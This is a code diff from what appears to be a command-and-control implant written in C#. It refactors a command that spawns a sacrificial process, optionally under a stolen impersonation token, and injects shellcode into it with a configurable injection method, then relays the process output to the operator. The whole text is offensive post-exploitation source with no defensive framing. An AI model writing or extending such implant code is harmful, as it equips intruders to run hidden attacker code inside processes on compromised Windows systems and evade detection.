@@ -7,6 +7,7 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using WinAPI;
 using WinAPI.Wrapper;
 
 namespace Agent.Commands
@@ -28,8 +29,6 @@ namespace Agent.Commands
             try
             {
 
-                var winAPI = WinAPIWrapper.CreateInstance(context.ConfigService.APIAccessType);
-
                 var creationParms = new ProcessCreationParameters()
                 {
                     Application = context.ConfigService.SpawnToX64,
@@ -42,12 +41,12 @@ namespace Agent.Commands
                 if (ImpersonationHelper.HasCurrentImpersonation)
                     creationParms.Token = ImpersonationHelper.ImpersonatedToken;
 
-                var procResult = winAPI.CreateProcess(creationParms);
+                var procResult = APIWrapper.CreateProcess(creationParms);
 
-                winAPI.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, context.ConfigService.APIInjectionMethod);
+                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, context.ConfigService.APIInjectionMethod);
 
                 if (creationParms.RedirectOutput)
-                    winAPI.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
+                    APIWrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
                 else
                     context.AppendResult($"Injection succeed.");
             }
